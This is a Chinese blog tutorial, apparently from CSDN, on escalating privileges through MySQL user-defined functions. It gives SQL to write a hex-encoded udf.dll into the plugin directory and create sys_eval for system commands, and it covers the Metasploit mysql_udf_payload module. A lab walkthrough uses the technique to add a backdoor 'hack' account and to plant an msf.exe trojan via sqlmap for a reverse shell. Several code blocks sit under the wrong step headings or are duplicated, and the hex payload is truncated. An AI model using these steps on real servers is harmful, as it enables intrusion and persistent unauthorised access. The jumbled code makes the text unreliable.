> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/qq_36119192/article/details/84863268)

**目录**

[UDF](#t0)

[UDF 提权步骤](#t1)

[使用 MSF 进行 UDF 提权](#t2)

[UDF 提权复现 (php 环境)](#t3)

UDF
---

**UDF (user defined function)**，即用户自定义函数。是通过添加新函数，对 MySQL 的功能进行扩充，其实就像使用本地 MySQL 函数如 user() 或 concat() 等。

那么，我们该如何使用 UDF 呢？

假设我的 UDF 文件名为 udf.dll，存放在 MySQL 安装目录的 lib/plugin 目录下 (当 MySQL>5.1，该目录默认不存在)。

![](https://img-blog.csdnimg.cn/20200421141330805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

在 udf.dll 文件中，我定义了名为 sys_eval() 的 MySQL 函数，该函数可以执行系统任意命令。但是如果我现在就打开 MySQL 命令行，使用 select sys_eval('whoami')；的话，系统会返回 sys_eval() 函数未定义。因为我们仅仅是把 udf.dll 放到了 lib/plugin 目录下，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。  
所以，我们应该把 udf.dll 中的自定义函数引入进来。看一下官方文档中的语法：

实例用法：

```
select * from mysql.func where name = 'sys_eval';    #查看创建的sys_eval函数
select sys_eval('whoami');                           #使用系统命令
```

只有两个变量:

*   一个是 function_name（函数名），我们想引入的函数是 sys_eval。
*   还有一个变量是 shared_library_name（共享包名称），即 udf.dll 。

至此我们已经引入了 sys_eval 函数，下面就可以使用了。  
这个函数用于执行系统命令，用法如下：

```
show global variables like 'secure%';
     当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权
     当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权
     当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权
```

*   当 MySQL< 5.1 版本时，将 .dll 文件导入到 c:\windows 或者 c:\windows\system32 目录下。
*   当 MySQL> 5.1 版本时，将 .dll 文件导入到 MySQL Server 5.xx\lib\plugin 目录下 (lib\plugin 目录默认不存在，需自行创建)。

### UDF 提权步骤

**一：查看  secure_file_priv  的值**

secure_file_priv 是用来限制 load dumpfile、into  outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限

```
select Host,user,plugin from mysql.user where user = substring_index(user(),'@',1);
        当 plugin 的值为空时不可提权
        当 plugin 值为 mysql_native_password 时可通过账户连接提权
```

我们先查看 secure_file_priv 的值是否为空，因为只有为空我们才能继续下面的提权步骤。

*   如果 secure_file_priv 为 NULL 是不能写入导出文件的。

![](https://img-blog.csdnimg.cn/20190922232119797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

*   如果 secure_file_priv 没有具体的值，则可以写入导出文件。

![](https://img-blog.csdnimg.cn/2019092223241953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

*    secure_file_priv 的值在 MySQL 数据库的安装目录的 my.ini 文件中配置。

![](https://img-blog.csdnimg.cn/2019092223262749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**二：查看 plugin 的值**

但是实际测试发现 UDF 提权成功与否与该值无关。

```
show variables like '%compile%';             #查看主机版本及架构
show variables like 'plugin%';               #查看 plugin 目录
```

![](https://img-blog.csdnimg.cn/20190922232744345.png)

**三：查看系统架构以及 plugin 目录**

```
create table temp(data longblob);
insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);
update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);
select data from temp into dumpfile "G:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll";
create function sys_eval returns string soname 'udf.dll';   #创建函数sys_eval
```

![](https://img-blog.csdnimg.cn/20190922233030922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这里是 x64 位的系统，我们可以去 kali 中 /usr/share/metasploit-framework/data/exploits/mysql/ 目录下载 64 位的 .dll 文件。(由于我这里 MSF 更改过，所以路径有所不同)

![](https://img-blog.csdnimg.cn/20190922233138843.png)

**四：将 dll 文件写入 plugin 目录, 并且创建函数**

创建一个表并将二进制数据插入到十六进制编码流中。你可以通过 insert 语句或将其分解为多个部分，然后通过 update 语句拼接二进制数据。

```
select * from mysql.func where name = 'sys_eval';    #查看创建的sys_eval函数
select sys_eval('whoami');                           #使用系统命令
```

执行 select data from temp into dumpfile "G:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll"; 时有可能会出现以下错误，因为当 MySQL 大于 5.1 时，默认是没有 lib\plugin 目录的。而 into dumpfile 在写入文件时也不能创建文件夹，所以也就报错了：Can't create/write to file 

![](https://img-blog.csdnimg.cn/20200421141437925.png)

而在执行 create function sys_eval returns string soname 'udf.dll'; 命令时出现 1126 - Can't open shared library'udf.dll'的错误。我看网上有的解释是说是因为在 MySQL 安装目录下默认没有 lib\plugin 目录导致的。但是我不认为是这个错误，因为如果上一步将 dll 文件写到 lib\plugin 目录没报错的话，说明 dll 文件已经写到 lib\plugin 目录了，因此也就不存在这个错误。但是目前还没有找到解决版本。

![](https://img-blog.csdnimg.cn/20200421144731571.png)

**五：使用系统命令**

在将 udf.dll 文件写入 plugin 目录后，我们就可以使用 sys_eval 函数了。

```
create function sys_eval returns string soname "XJhSEGuE.dll";
select sys_eval("whoami");
```

### ![](https://img-blog.csdnimg.cn/20190923091328559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果得到了数据库的用户名和密码，并且可以远程连接的话，可以使用 MSF 里面的 **exploit/multi/mysql/mysql_udf_payload** 模块自动注入。

### 使用 MSF 进行 UDF 提权

使用 MSF 中的 exploit/multi/mysql/mysql_udf_payload 模块也可以进行 UDF 提权。MSF 会将 dll 文件写入 lib\plugin \ 目录下 (前提是该目录存在，如果该目录不存在的话，则无法执行成功)，dll 文件名为任意创建的名字。该 dll 文件中包含 sys_exec() 和 sys_eval()两个函数，但是默认只创建 sys_exec()函数，该函数执行并不会有回显。我们可以手动创建 sys_eval() 函数，来执行有回显的命令。

![](https://img-blog.csdnimg.cn/20200507214158151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200507214233517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
select * from mysql.func where name = "sys_exec";
```

![](https://img-blog.csdnimg.cn/20200507214350972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

手动使用该 dll 文件创建 sys_eval() 函数，来执行有命令的回显。

```
create function sys_eval returns string soname "XJhSEGuE.dll";
select sys_eval("whoami");
```

![](https://img-blog.csdnimg.cn/20200507221451754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### UDF 提权复现 (php 环境)

> 靶机环境：Windows Server 2003 、php 5.4.3 、 Apache2.4.23

这里我们已经通过上传一句话木马拿到网站的 shell 了，并且得到了网站数据库的用户名和密码都是 root。但是因为获得的系统用户权限太低，无法创建新用户。而且也不能使用其他提权等手段。所以，我们现在要做的就是使用 UDF 进行提权。

首先，我们把  phpspy.php 和　udf.php 两个文件上传到网站服务器

![](https://img-blog.csdnimg.cn/20181206192016729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后先访问 phpspy.php 页面，MySQL Manager——> 输入数据库的密码——> 选择一个数据库

![](https://img-blog.csdnimg.cn/20181206192617112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

由于 MySQL>5.2 版本后，在其安装目录的 lib 目录下没有 plugin 目录，所以，我们得新建这个目录，并且将我们的 udf.dll 文件放入 plugin 目录下，我们执行下面命令，完成创建 plugin 目录，并且将 udf.dll 放入该目录下

```
select 'xxxxxx' into dumpfile 'C:\\Program\ Files\\MySQL\\MySQL\ Server\ 5.4\\lib\\plugin::$INDEX_ALLOCATION'
```

![](https://img-blog.csdnimg.cn/20181206193048723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后我们访问 udf.php 页面，并且用数据库的账户名和密码登录。这是登录后的页面

![](https://img-blog.csdnimg.cn/20181206193217934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后我们点击 Dump UDF ，提示 Dump DLL Success ！

![](https://img-blog.csdnimg.cn/20181206193309353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后我们点击 Create Function，下面就会有 select  shell('cmd','whoami') ，然后我们点击 Mysql_query ，下面就会有 whoami 命令的执行结果

![](https://img-blog.csdnimg.cn/20181206193448733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们可以把命令换成  net  user   hack  123  /add  ，新建一个用户，可以看到成功了！然后我们接下来吧 hack 用户添加到 administrators 管理员组内，就可以远程登录了！

![](https://img-blog.csdnimg.cn/2018120619374269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### UDF 提权后如何反弹 shell

当 UDF 提权后，我们想反弹一个 MSF 或者 CS 的 shell。

首先使用 CS 的 Powershell 反弹命令是不行的，这里由于 powershell 命令引号过多，不能执行。

我们现在的思路是执行木马文件，反弹 shell。这里由于 sys_eval 函数不能执行 windows 那些远程下载命令，所以我们选择通过 sqlmap 的写入文件功能，将木马写入当前目录。

首先，查看当前目录

![](https://img-blog.csdnimg.cn/20200508093222666.png)

然后 sqlmap 写入木马。这里本来是准备远程下载的，但是发现 certutil 和 bitsadmin 执行都发生错误，有可能是这个机器的问题。

```
sqlmap -u "http://192.168.10.130/?id=2" --file-write msf.exe --file-dest "C:\phpStudy\PHPTutorial\MySQL\data\hack.exe"
```

![](https://img-blog.csdnimg.cn/20200508094608777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

执行木马反弹。这里需要注意的是，sys_eval 函数只能执行当前目录下的文件，所以，也只能把文件写入当前路径下。

![](https://img-blog.csdnimg.cn/20200508094752155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

相关文章：[利用 MySQL UDF 进行的一次渗透测试](https://www.freebuf.com/articles/system/163144.html)

相关文章：[PR 提权](https://blog.csdn.net/qq_36119192/article/details/84562454)